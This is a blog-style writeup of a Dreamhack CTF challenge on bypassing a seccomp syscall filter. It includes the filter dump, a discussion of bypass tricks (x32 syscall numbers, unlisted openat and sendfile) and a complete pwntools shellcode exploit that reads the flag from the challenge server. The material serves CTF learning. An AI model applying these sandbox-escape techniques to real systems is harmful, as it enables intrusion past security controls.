+++
date = '2026-05-12'
draft = false
title = 'Dreamhack Bypass SECCOMP-1 Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
Exploit Tech: Bypass SECCOMP에서 실습하는 문제입니다.

---


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *s; // [rsp+10h] [rbp-10h]

  s = mmap(0, 0x1000u, 7, 33, -1, 0);
  init(0);
  memset(s, 0, 0x1000u);
  printf("shellcode: ");
  read(0, s, 0x1000u);
  sandbox(0);
  ((void (__fastcall *)(_QWORD))s)(0);
  return 0;
}
```

## Identifying the vulnerabilities

```bash
┌──(ctf-venv)─(kali㉿kali)-[~/ctf/pwn]
└─$ seccomp-tools dump /home/kali/Downloads/dreamhack/bypassseccomp1/bypass_seccomp
shellcode: 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0010
 0006: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0010
 0007: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0010
 0008: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL                                                    
```

So this is a shellcoding seccomp challenge.

For our arch, it checks if the syscall number is bigger than `0x40000000`, in which case it only allows `0xffffffff`. That's pretty weird, right? 

Well, one seccomp bypass is calling 32-bit syscalls, which are recognized by bit 30 being turned on. So while `0x3b` is blocked, `0x4000003b` will do the same thing and bypass the filter.

And the `0xffffffff` allowed one is harmless.

Then, it's specified that `write`, `open`, `execve` and `execveat` are blacklisted.

But `openat` isn't blacklisted, and neither is `pwrite64`. So let's start an `openat`, `read`, `pwrite64` chain.

---

![challenge-screenshot](lcoal.png#center)

I wrote the shellcode, ran it locally, but I was getting EOF. Looking through the debugger, it looks like the final write was the one failing. And that's the one with four parameters. I was using `rcx` as my fourth, but apparently that's not the way it works with syscalls:

> User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9.

That's because the syscall instructions clobbers rcx somehow. I moved to `r10`, but as it always happens, after fixing an error, two more pop out. This time, I got back the error code -38 to my syscall. So my `pwrite64` was either getting blacklisted, or it was something else I don't understand.

---

After that, I pivoted to `sendfile`. That's supposed to look like `sendfile(out_fd, in_fd, offset, count)`.

And, that worked! I connected remotely and grabbed the flag.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
from utils.pushstr import pushstr
elf = ELF('/home/kali/Downloads/dreamhack/bypassseccomp1/bypass_seccomp')

context.arch = 'amd64'
context.os = 'linux'
cyberedu = 'host8.dreamhack.games:16771'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p)

#openat, read, pwrite64.
shellcode_openat = asm(f"""
mov rdi, -100
{pushstr('flag')}
mov rsi, rsp
xor rdx, rdx

mov rax, 257
syscall
""")


shellcode_sendfile = asm('''
mov rsi, rax
mov rdi, 1
xor rdx, rdx
mov r10, 0x60

mov rax, 40
syscall
''')

shellcode = shellcode_openat + shellcode_sendfile
p.recvuntil(b": ")
p.send(shellcode)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/bypass_seccomp.py)**.
